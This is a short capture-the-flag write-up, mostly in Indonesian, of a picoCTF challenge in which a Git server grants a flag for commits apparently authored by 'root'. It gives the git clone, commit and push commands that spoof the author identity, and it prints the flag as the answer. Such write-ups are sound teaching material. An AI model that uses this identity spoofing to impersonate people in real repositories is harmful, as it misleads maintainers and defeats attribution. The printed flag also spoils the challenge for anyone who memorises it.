# Writeup: MY GIT (Challenge ID: 764)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** General Skills / Version Control Security
- **Difficulty:** Easy
- **Author:** CyLab Team
- **Event:** picoCTF 2026
- **Points:** 100
- **Flag:** `academy{1mp3rs0n4t4_g17_345y_f382bd68}`

---

## Deskripsi Tantangan
> I have built my own Git server with my own rules! Check the README to get your flag!
> Hint: How do you specify your Git username and email?

---

## Analisis & Eksploitasi Impersonasi Git
Repositori di-clone melalui SSH:
```bash
git clone ssh://git@xebec.cylabacademy.net:34513/git/challenge.git
```

Isi `README.md`:
> Only flag.txt pushed by `root:root@academy` will be updated with the flag.

Server Git menerapkan pre-receive atau update hook yang memeriksa metadata identitas committer/author:
- Git tidak melakukan kriptografi penandatanganan identitas secara default kecuali GPG diwajibkan.
- Siapa pun dapat mengubah metadata nama dan email commit secara lokal menggunakan flag `-c user.name` dan `-c user.email`.

### Langkah Eksploitasi
```bash
echo "give me the flag" > flag.txt
git add flag.txt
git -c user.name="root" -c user.email="root@academy" commit -m "Add flag.txt"
git push origin master
```

Respons remote git hook:
```text
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: academy{1mp3rs0n4t4_g17_345y_f382bd68}
```

Flag: `academy{1mp3rs0n4t4_g17_345y_f382bd68}`.
